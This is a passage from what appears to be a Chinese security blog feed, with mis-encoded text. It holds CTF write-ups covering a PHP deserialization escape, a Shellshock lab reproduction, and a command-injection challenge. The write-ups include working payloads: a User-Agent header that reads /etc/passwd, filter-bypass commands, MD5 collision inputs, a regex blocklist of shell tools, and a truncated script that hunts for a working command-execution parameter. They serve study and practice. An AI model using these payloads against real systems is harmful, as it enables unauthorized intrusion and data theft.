<p>æ‰€ä»¥è¿™ä¸ªå­—ç¬¦ä¸²è¿˜æ˜¯æ»¡è¶³åºåˆ—åŒ–çš„ç‰¹å¾çš„ï¼Œåªä¸è¿‡åˆ©ç”¨æŸç§åŠæ³•è®©åŸæ¥çš„userçš„33ä¸ªå­—ç¬¦æ¶ˆå¤±äº†ï¼Œä»è€Œå°†åé¢çš„å­—ç¬¦ä¸²ï¼ˆæˆ‘ä»¬æ³¨å…¥çš„å­—ç¬¦ä¸²ï¼‰å½“ä½œåŸæ¥æ•°ç»„ä¸­çš„æ•°æ®ã€‚ä»è€Œå®ç°äº†é€ƒé€¸ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:33:&quot;&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;s:3:&quot;hdf&quot;;s:3:&quot;zzf&quot;;&#125;1341414141412412412</span><br></pre></td></tr></table></figure></p>
<p>ä¹Ÿèƒ½å¤ŸæˆåŠŸã€‚å› ä¸ºååºåˆ—åŒ–æ—¶åªè¦<code>a:3:&#123;s:4:"user";s:33:"";s:8:"function";s:10:"show_image";s:3:"img";s:13:"guest_img.png";s:3:"hdf";s:3:"zzf";&#125;</code>æ»¡è¶³è§„å¾‹ï¼Œå¹¶ä¸”å·²ç»èƒ½å¤Ÿè¿”å›æ•°ç»„äº†ï¼Œé‚£ä¹ˆåé¢çš„å­—ç¬¦ä¸²å°±ä¼šè¢«ä¸¢å¼ƒã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409203924.png" /></p>
<h2 id="æœ¬é¢˜åˆ©ç”¨">æœ¬é¢˜åˆ©ç”¨</h2>
<p>å…ˆç›´æ¥ç»™å‡ºpayloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: f=show_image</span><br><span class="line"></span><br><span class="line">POST: _SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>ä¸Šè¿°çš„å†…å®¹é€šè¿‡åºåˆ—åŒ–å¾—åˆ°ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯ï¼Œflagä¼šè¢«è¿‡æ»¤ï¼Œå¯¼è‡´å˜æˆå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>è€Œ<code>user</code>çš„å€¼çš„24ä¸ªå­—ç¬¦å¾€åæ‰¾ï¼Œæ­£å¥½æ˜¯<code>";s:8:"function";s:59:"a</code>ã€‚ä»è€Œå°†ä¸Šé¢çš„å­—ç¬¦ä¸²åˆ†ä¸ºå‡ å¤§éƒ¨åˆ†ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;</span><br><span class="line">s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;</span><br><span class="line">s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</span><br><span class="line">s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</span><br><span class="line">&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>å‰å››è¡Œæ­£å¥½èƒ½å¤Ÿæ»¡è¶³åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²çš„è§„å¾‹ï¼Œå› æ­¤å¯¹ä¸Šè¿°å­—ç¬¦ä¸²ååºåˆ—å¾—åˆ°çš„æ•°ç»„å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409204732.png" /></p>
<p>æˆåŠŸå°†æˆ‘ä»¬æƒ³è¦è¯»å–çš„æ–‡ä»¶åæ³¨å…¥ã€‚æœ€åçš„é‚£ä¸ªåªæ˜¯å› ä¸ºæ•°ç»„éœ€è¦ä¸‰ä¸ªé”®å€¼å¯¹ä»è€Œå‡‘å¾—ã€‚</p>
<p>å…¶å®<code>d0g3_f1ag.php</code>è¯»å–åˆ°çš„æ˜¯flagæ–‡ä»¶åæ˜¯ä»€ä¹ˆã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409204918.png" /></p>
<p>å°†flagæ–‡ä»¶åbase64ç¼–ç åæ›¿ä»£åŸæ¥æ–‡ä»¶åçš„ä½ç½®ï¼ˆæ³¨æ„é•¿åº¦æ˜¯å¦æœ‰å˜åŒ–ï¼‰å³å¯ï¼ˆæ³¨æ„é‚£ä¸ªæ–œæ ä¹Ÿæ˜¯æ–‡ä»¶åçš„ä¸€éƒ¨åˆ†ï¼ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409205037.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</tag>
        <tag>PHPå˜é‡è¦†ç›–</tag>
      </tags>
  </entry>
  <entry>
    <title>å¤ç°ï¼šBash Shellshock ç ´å£³æ¼æ´ï¼ˆCVE-2014-6271ï¼‰</title>
    <url>/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/</url>
    <content><![CDATA[<p>ä¸ªäººçš„æ¼æ´å¤ç°ç»ƒä¹ ï¼Œè¯·å¤šæ‰¹è¯„ï¼</p>
<span id="more"></span>
<h1 id="æ¼æ´ä¿¡æ¯">æ¼æ´ä¿¡æ¯</h1>
<p>Bashä½¿ç”¨çš„ç¯å¢ƒå˜é‡æ˜¯é€šè¿‡å‡½æ•°åç§°æ¥è°ƒç”¨çš„ï¼Œå¯¼è‡´æ¼æ´å‡ºé—®é¢˜æ˜¯ä»¥<code>()&#123;</code>å¼€å¤´å®šä¹‰çš„ç¯å¢ƒå˜é‡åœ¨å‘½ä»¤ENVä¸­è§£ææˆå‡½æ•°åï¼ŒBashæ‰§è¡Œå¹¶æœªé€€å‡ºï¼Œè€Œæ˜¯ç»§ç»­è§£æå¹¶æ‰§è¡Œshellå‘½ä»¤ã€‚è€Œå…¶æ ¸å¿ƒçš„åŸå› åœ¨äºåœ¨<strong>è¾“å…¥çš„è¿‡æ»¤ä¸­æ²¡æœ‰ä¸¥æ ¼é™åˆ¶è¾¹ç•Œï¼Œä¹Ÿæ²¡æœ‰åšå‡ºåˆæ³•åŒ–çš„å‚æ•°åˆ¤æ–­</strong>ã€‚</p>
<p>å‚è€ƒé“¾æ¥ï¼š - https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md</p>
<p>å½±å“ç‰ˆæœ¬ï¼š - bash version &lt;= 4.3</p>
<p>è·¯å¾„ï¼š - <code>vulhub-master/bash/shellshock</code></p>
<p>å¯åŠ¨ç¯å¢ƒï¼š - <code>sudo docker-compose up -d</code> - è¾“å…¥Â <code>http://ip:8080</code>Â å³å¯è®¿é—®</p>
<h1 id="å¤ç°">å¤ç°</h1>
<p>æœåŠ¡å¯åŠ¨åï¼Œæœ‰ä¸¤ä¸ªé¡µé¢<code>http://your-ip:8080/victim.cgi</code>å’Œ<code>http://your-ip:8080/safe.cgi</code>ã€‚å…¶ä¸­safe.cgiæ˜¯æœ€æ–°ç‰ˆbashç”Ÿæˆçš„é¡µé¢ï¼Œvictim.cgiæ˜¯bash4.3ç”Ÿæˆçš„é¡µé¢ã€‚</p>
<p>ç›´æ¥è®¿é—®<code>http://192.168.100.16:8080/victim.cgi</code>ï¼Œå¾—åˆ°å¦‚ä¸‹ç•Œé¢</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203007.png" /></p>
<p>æ­¤æ—¶ï¼Œå¾€HTTPå¤´éƒ¨çš„<code>User-Agent</code>å†™å…¥å¦‚ä¸‹å‘½ä»¤ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; /bin/cat /etc/passwd</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203313.png" /></p>
<p>åŒæ ·çš„ï¼Œå¯¹<code>safe.cgi</code>åšä¸€æ ·çš„è¿‡ç¨‹ï¼Œå‘ç°æ²¡æœ‰ä»»ä½•äº‹å‘ç”Ÿ</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203401.png" /></p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>ç ´å£³æ¼æ´</tag>
        <tag>shellshock</tag>
      </tags>
  </entry>
  <entry>
    <title>å®‰æ´µæ¯ 2019 easy_web</title>
    <url>/2022/04/01/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%20easy_web/</url>
    <content><![CDATA[<p>BUUCTF ç½‘å€ï¼šhttps://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒï¼Œå…ˆæ£€æŸ¥äº†æºç ï¼Œå‘ç°äº†è¿”å›äº†ä¸€å¼ å›¾ç‰‡ç»è¿‡base64ç¼–ç åçš„å†…å®¹ã€‚å¹¶ä¸”æœ‰ä¸€å¥æç¤ºï¼š<code>md5 is funny</code>ã€‚ç„¶åè§‚å¯Ÿurl <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d835c69c-0e67-4191-8b98-d25591d19b6e.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br></pre></td></tr></table></figure></p>
<p>æ³¨æ„åˆ°ä¸¤ä¸ªå‚æ•°<code>cmd</code>å’Œ<code>img</code>ã€‚åè€…çš„å†…å®¹åƒæ˜¯ç»è¿‡base64ç¼–ç çš„ï¼Œå› æ­¤å…ˆè¿›è¡Œè§£ç ã€‚æ¨èç½‘å€ï¼šhttps://gchq.github.io/CyberChef/</p>
<p>è°ƒç”¨<code>magic</code>æ¨¡å—ï¼Œå‘ç°ç¼–ç è§„åˆ™ï¼Œå…ˆç»è¿‡ä¸¤æ¬¡base64ï¼Œç„¶åå†è¿›è¡Œ16è¿›åˆ¶è§£ç è¿˜åŸåŸæ¥çš„å­—ç¬¦ä¸²ã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401220118.png" /></p>
<p>å› æ­¤ï¼Œè¿™é‡Œå¯ä»¥ä¼ å…¥ä¸€ä¸ªæ–‡ä»¶åã€‚è™½ç„¶æœ‰å¯èƒ½åªæ¥å—å›¾ç‰‡ï¼Œä½†æ˜¯ä½œä¸ºå°è¯•å¯ä»¥è¯•ä¸€ä¸‹<code>index.php</code>ã€‚</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>é¦–å…ˆå°†<code>index.php</code>è¿›è¡Œç¼–ç ï¼Œç„¶åä¼ å…¥imgå‚æ•°ï¼Œcmdå…ˆä¿æŒä¸å˜ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401220308.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401220429.png" /></p>
<p>å°†è¿”å›çš„å†…å®¹base64è§£ç åå¾—åˆ°å¦‚ä¸‹ä»£ç ï¼ˆé‡è¦éƒ¨åˆ†ï¼‰ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">	</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;      <span class="comment">// imgä¸èƒ½å«æœ‰flag</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixiï½ no flag&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;  <span class="comment">// ä¼šå°†ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>echo `$cmd`; è¿™å¥è¯ä¼šå°† cmd å˜é‡ä½œä¸ºç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå¹¶è¾“å‡ºï¼Œåƒæ˜¯echo system($cmd)</p>
</blockquote>
<p>è¿™ä¸ªä»£ç å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†å…³äºimgå‚æ•°ï¼Œä¸»è¦ä½œç”¨å°±æ˜¯è¯»å–æ–‡ä»¶å†…å®¹ï¼›ç¬¬äºŒéƒ¨åˆ†å°±æ˜¯cmdå‚æ•°ï¼Œä¸»è¦ä½œç”¨å°±æ˜¯å‘½ä»¤æ‰§è¡Œã€‚ç”±äºimgè¿‡æ»¤äº†flagï¼Œæ‰€ä»¥è¯»å–flagçš„å†…å®¹åº”è¯¥é€šè¿‡å‘½ä»¤æ‰§è¡Œè·å¾—ã€‚å³é‡è¦çš„æ˜¯ç¬¬äºŒéƒ¨åˆ†ã€‚</p>
<p>ç¬¬äºŒéƒ¨åˆ†æœ‰ä¸€ä¸ªéš¾é¢˜ï¼Œé‚£å°±æ˜¯å¦‚ä½•ç»•è¿‡å¦‚ä¸‹ä»£ç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœåªæœ‰åè€…ï¼Œå¯ä»¥é€šè¿‡ä¼ å…¥æ•°ç»„ç»•è¿‡ï¼Œä½†æ˜¯å‰é¢çš„å´æ— æ³•è¿™æ ·ç»•è¿‡ã€‚å› æ­¤åªèƒ½ä½¿ç”¨md5ç¢°æ’æ¥ç»•è¿‡ï¼Œä¹Ÿå°±æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸ä¸€æ ·ï¼Œä½†æ˜¯å®ƒä»¬md5å€¼ä¸€æ ·ï¼Œä»ç½‘ä¸Šæ‰¾åˆ°äº†ä¸¤ç»„ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure></p>
<p>è¿™é‡Œæ¯”è¾ƒéš¾ä»¥ç†è§£çš„æ˜¯ä¸ºä»€ä¹ˆåæ–œæ å¯ä»¥ç»•è¿‡ï¼š<code>l\s</code> å¯ä»¥æ‰§è¡Œã€‚</p>
<blockquote>
<p>phpè§£é‡Šå™¨ä¼šå°†<code>//</code>è§£é‡Šä¸ºä¸€ä¸ªåæ–œæ ï¼›æ­£åˆ™è§£é‡Šå™¨ä¹Ÿæ˜¯ä¸€ä¸ªé“ç†ã€‚å¦‚æœè¦ç”¨phpæ­£åˆ™åŒ¹é…ä¸€ä¸ªåæ–œæ ï¼Œéœ€è¦å†™4ä¸ªåæ–œæ ï¼Œå› ä¸ºå››ä¸ªåæ–œæ ç»è¿‡phpè§£é‡Šå™¨ä¼šå˜æˆä¸¤ä¸ªåæ–œæ ï¼Œä¸¤ä¸ªåæ–œæ ç»è¿‡æ­£åˆ™è§£é‡Šå™¨ä¼šå˜æˆä¸€ä¸ªåæ–œæ ï¼Œæ‰€ä»¥èƒ½å¤ŸåŒ¹é…ã€‚ä½†æ˜¯åå¸¸çš„æ˜¯æœ‰æ—¶å€™ä¸‰ä¸ªåæ–œæ æ‰èƒ½æ­£åˆ™åŒ¹é…ä¸€ä¸ªåæ–œæ ï¼ˆæœ¬é¢˜å°±æ˜¯ï¼‰ï¼Œæ‰€ä»¥æœ¬é¢˜å¯ä»¥ä½¿ç”¨åæ–œæ ç»•è¿‡ã€‚</p>
</blockquote>
<p>ä½†æ˜¯ä¹Ÿå¯ä»¥ç”¨å…¶ä»–åŠæ³•ï¼Œæ¯”å¦‚<code>ls</code>ç”¨<code>dir</code>ä»£æ›¿ï¼Œ<code>cat</code> ç”¨<code>sort</code>ä»£æ›¿ã€‚å› æ­¤payloadå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. dir+/</span><br><span class="line">2. sort+/flag</span><br></pre></td></tr></table></figure></p>
<p>ç”¨burpæäº¤ï¼+ä¹Ÿå¯ä»¥ç”¨%20ä»£æ›¿ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401223906.png" /></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>æœ¬é¢˜çš„éš¾ç‚¹ä¸»è¦åœ¨äºMD5ç¢°æ’å’Œæœ€åçš„è¿‡æ»¤ç»•è¿‡ã€‚å°¤å…¶æ˜¯åæ–œæ ç»•è¿‡ï¼Œå®åœ¨ä¸èƒ½ç†è§£ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>phpä¼ªåè®®</tag>
        <tag>MD5ç¢°æ’ç»•è¿‡</tag>
      </tags>
  </entry>
  <entry>
    <title>å¼ºç½‘æ¯ 2019 é«˜æ˜çš„é»‘å®¢</title>
    <url>/2022/03/29/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
    <content><![CDATA[<p>BUUCTF ç½‘å€ï¼šhttps://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒï¼Œå¾—åˆ°å¦‚ä¸‹ä¿¡æ¯</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329083958.png" /></p>
<p>å› æ­¤è®¿é—®å¦‚ä¸‹ç½‘å€ï¼Œå°†æºç ä¸‹è½½ä¸‹æ¥ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://12e408b2-7b34-441d-a3f5-a689f716cfd5.node4.buuoj.cn:81/www.tar.gz</span><br></pre></td></tr></table></figure></p>
<p>å‘ç°æœ‰ 3002 ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”é™¤äº†ä¸€ä¸ª <code>index.html</code> ä¹‹å¤–ï¼Œå…¶ä»–çš„æ–‡ä»¶é‡Œé¢å……æ–¥ç€ <code>$_GET</code> <code>$_POST</code> <code>system</code> ï¼Œä¸€çœ‹å°±æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯éšä¾¿æ‰“å¼€æ–‡ä»¶ï¼Œæ‹¿å‡ºä¸€ä¸ªå°è¯•å´ä¸è¡Œã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084335.png" /></p>
<p>å› æ­¤è®¤ä¸ºï¼Œè¿™3000+æ–‡ä»¶é‡Œé¢ï¼Œåªæœ‰ä¸€ä¸ªæ–‡ä»¶çš„ä¸€ä¸ª payload æ˜¯æœ‰æ•ˆçš„ï¼Œå…¶ä»–çš„æ–‡ä»¶å’Œ payload åªä¸è¿‡æ˜¯è¿™ä¸ª â€œé«˜æ˜çš„é»‘å®¢â€ å¼„å‡ºæ¥çš„ä¼ªè£…ã€‚</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>3000å¤šæ–‡ä»¶ï¼Œæ‰‹åŠ¨éªŒè¯è‚¯å®šæ˜¯ä¸å¯èƒ½çš„ï¼Œå› æ­¤ä½¿ç”¨è„šæœ¬ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, os, re, time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED, as_completed</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/BUUtest/src/&#x27;</span></span><br><span class="line">filePath = <span class="string">&#x27;D:\\phpStudy2018\\PHPTutorial\\WWW\\BUUtest\\src\\&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">file</span>):</span></span><br><span class="line">    pattern = <span class="string">&quot;(\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\]&quot;</span></span><br><span class="line">    gets = []</span><br><span class="line">    posts = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;æ­£åœ¨å°è¯• <span class="subst">&#123;file&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filePath+file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.readlines()</span><br><span class="line">    <span class="comment"># æ‰¾å‡ºæ‰€æœ‰çš„ (\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\] ä¸­çš„å•å¼•å·çš„å†…å®¹ï¼Œå³å‚æ•°</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        s = re.search(pattern, line)</span><br><span class="line">        <span class="keyword">if</span> s:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;GET&quot;</span> <span class="keyword">in</span> s.group():</span><br><span class="line">                gets.append(s.group(<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                posts.append(s.group(<span class="number">2</span>))</span><br><span class="line">        <span class="comment"># print(gets)</span></span><br><span class="line">        <span class="comment"># print(posts)</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;echo &quot;success!!!&quot;&#x27;</span></span><br><span class="line">    <span class="comment"># å¼€å§‹å‘é€ GET è¯·æ±‚</span></span><br><span class="line">    <span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">        newUrl = url + file + <span class="string">&quot;?&quot;</span> + get + <span class="string">&quot;=&quot;</span> + payload</span><br><span class="line">        <span class="comment"># print(newUrl)</span></span><br><span class="line">        r = requests.get(newUrl)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is get and payload is <span class="subst">&#123;get&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># å¼€å§‹å‘é€ POST è¯·æ±‚</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> posts:</span><br><span class="line">        newUrl = url + file</span><br><span class="line">        r = requests.post(newUrl, data=&#123;post: payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is post and payload is <span class="subst">&#123;post&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span 